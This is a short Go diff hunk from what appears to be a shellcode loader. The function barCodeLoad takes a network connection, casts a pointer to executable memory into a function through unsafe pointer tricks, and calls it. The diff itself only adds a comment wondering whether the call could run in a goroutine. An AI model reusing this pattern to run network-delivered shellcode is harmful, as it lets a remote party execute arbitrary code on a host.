@@ -31,6 +31,7 @@ func barCodeLoad(conn *net.Conn) { //Works with x64 only.
 	memoryPtr := &executableMemory
 	ptr := unsafe.Pointer(&memoryPtr)
 	shellcodeFunc := *(*func())(ptr)
+	//Try to run this concurently with goroutine ?!
 	shellcodeFunc()
 
 }
